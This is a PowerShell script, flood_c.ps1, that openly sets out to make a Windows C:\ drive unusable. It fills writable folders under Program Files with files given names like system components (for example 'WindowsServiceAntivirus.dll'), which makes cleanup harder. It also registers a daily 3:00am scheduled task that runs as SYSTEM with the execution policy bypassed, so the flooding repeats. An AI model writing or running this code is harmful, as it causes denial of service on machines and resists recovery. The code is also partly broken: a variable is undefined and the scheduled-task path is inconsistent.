<#
  .SYNOPSIS
  Disables use of the C:\ drive by flooding it with randomly generated files.

  .DESCRIPTION
  The flood_c.ps1 script will calculate the remaining available space on the C:\
  drive, then create randomly named files of random sizes to disperse throughout 
  the C:\ drive until it is full. The script will then create a scheduled task
  to run this script every day at 3:00am.

  .INPUTS
  None. You cannot pipe objects to flood_c.ps1.

  .OUTPUTS
  None. flood_c.ps1 does not generate any output.

  .EXAMPLE
  PS> .\flood_c.ps1
#>

# STEP 1
# Find every writable directory on the C:\ drive and put each path into an array.
Function Get-Directories {
    Param (
        [string]$TargetDrive = "C:\Program Files"
    )
    $DirectoriesList = @()
    $ChildDirectories = Get-ChildItem -Path $TargetDrive -Recurse -Directory -Force -ErrorAction SilentlyContinue | Select-Object FullName
    Write-Host "Total directories found:" $ChildDirectories.Count
    foreach ($directory in $ChildDirectories) {
        Write-Host "Found directory: $($directory.FullName)"
        try {
            $testFile = Join-Path $directory.FullName "test-file.tmp"
            $null = New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop
            if (Test-Path -Path $testFile -PathType Leaf -ErrorAction SilentlyContinue) {
                $DirectoriesList += $directory.FullName
                Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
            }
        } catch {
            Write-Warning "Error in directory: $($directory.FullName) - $($_.Exception.Message)"
            continue
        }
    }
    Write-Host "Writable directories count:" $DirectoriesList.Count
    return $DirectoriesList
}

$writableDirectories = Get-Directories -TargetDrive $TargetDrive
Write-Host "Writable directories count: $($writableDirectories.Count)"

# STEP 2
# Calculate remaining space on the C:\ drive.
Function Get-FreeSpace {
	Param (
		[string]$TargetDrive = "C:\"
	)
	
	$FreeSpace = Get-PSDrive -Name ($TargetDrive.TrimEnd(':')) | Select-Object -Property Free
	$FreeBytes = [int64]$FreeSpace.Free
	$FreeGigabytes = [math]::Round($FreeBytes / 1GB)
	return $FreeGigabytes
}

# STEP 3
# Randomize the file names and file extensions by combining parts from three arrays and a file extension.
Function Set-FileNames() {
    $FileName01 = @('Windows', 'Microsoft', 'WMI')
    $FileName02 = @('Client', 'Server', 'Console', 'Desktop', 'Local', 'Service', 'System')
    $FileName03 = @('Host', 'Network', 'Firewall', 'Diagnostic', 'Policy', 'Agent', 'Antivirus', 'Application', 'Manager', 'Runtime', 'Driver', 'Session', 'Container', 'Process', 'Framework', 'Extension')
    $FileExtension = @('.log', '.exe', '.ini', '.dll', '.dat', '.xml', '.txt')

    $allFileNames = @()

    foreach ($part1 in $FileName01) {
        foreach ($part2 in $FileName02) {
            foreach ($part3 in $FileName03) {
                foreach ($ext in $FileExtension) {
                    $allFileNames += $part1 + $part2 + $part3 + $ext
                }
            }
        }
    }

    # Shuffle the array
    $shuffledFileNames = $allFileNames | Sort-Object { Get-Random }

    return $shuffledFileNames
}


# STEP 4
# Create files of random sizes that equal the remaining space.
Function Get-RandomFileSize {
    $RandomFileSize = Get-Random -Min 1000 -Max 5000
    $FileSize = $RandomFileSize * 1kb
    return $FileSize
}

# STEP 5
# Distribute each random file into a random directory on the C:\ drive
Function Create-RandomFiles {
    Param (
        [string]$TargetPath = "C:\Program Files"
    )

    $writableDirectories = Get-Directories -TargetDrive $TargetPath
    $TargetDrive = ($TargetPath -split ":")[0] + ":"
    $remainingSpace = Get-FreeSpace -TargetDrive $TargetDrive
    $remainingSpaceBytes = $remainingSpace * 1GB
    $shuffledFileNames = Set-FileNames
    $fileIndex = 0

    while ($remainingSpaceBytes -gt 0 -and $fileIndex -lt $shuffledFileNames.Count) {
        $randomDirectory = $writableDirectories | Get-Random
        $randomFileName = $shuffledFileNames[$fileIndex]
        $randomFilePath = Join-Path $randomDirectory $randomFileName
        $randomFileSize = Get-RandomFileSize

        try {
            if ($remainingSpaceBytes -ge $randomFileSize) {
                $file = New-Item -ItemType File -Path $randomFilePath -Force
                $fileStream = $file.OpenWrite()
                $fileStream.SetLength($randomFileSize)
                $fileStream.Close()
                $remainingSpaceBytes -= $randomFileSize
            } else {
                $file = New-Item -ItemType File -Path $randomFilePath -Force
                $fileStream = $file.OpenWrite()
                $fileStream.SetLength($remainingSpaceBytes)
                $fileStream.Close()
                $remainingSpaceBytes = 0
            }
        } catch {
            Write-Warning "Error creating file: $($randomFilePath) - $($_.Exception.Message)"
            break
        }

        $fileIndex++
    }
}


# Call the Create-RandomFiles function
Create-RandomFiles



# STEP 6
# Create a scheduled task to run this script at certain intervals (e.g., every day at 3:00 AM)

$TaskName = "RandomFilesGenerator"
$TaskDescription = "A task to generate random files and distribute them in writable directories on the C:\ drive."
$TaskScriptPath = "C:\Users\Administrator\Desktop\disable_drive.ps1" # Replace this with the path to your script
$TaskStartTime = (Get-Date).Date.AddHours(3)

# Check if the task already exists
$ExistingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

# Create a new trigger for daily execution at the specified time
$Trigger = New-ScheduledTaskTrigger -Daily -At $TaskStartTime

# Create an action to run the PowerShell script
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $TaskScriptPath"

# Set the principal to run the task with the highest privileges
$Principal = New-ScheduledTaskPrincipal -UserId "System" -LogonType ServiceAccount -RunLevel Highest

# Create the scheduled task
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -Description $TaskDescription -Principal $Principal

# Register the scheduled task
if ($ExistingTask) {
    # Update the existing task
    $ExistingTask.Actions = $Action
    $ExistingTask.Triggers = $Trigger
    $ExistingTask.Settings = $Settings
    $ExistingTask.Description = $TaskDescription
    $ExistingTask.Principal = $Principal
    Set-ScheduledTask -TaskName $TaskName -TaskPath $ExistingTask.TaskPath -Action $ExistingTask.Actions -Trigger $ExistingTask.Triggers -Settings $ExistingTask.Settings -Principal $ExistingTask.Principal
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description $TaskDescription -Principal $Principal -Force
} else {
    # Create a new task
    Register-ScheduledTask -TaskName $TaskName -InputObject $Task
}
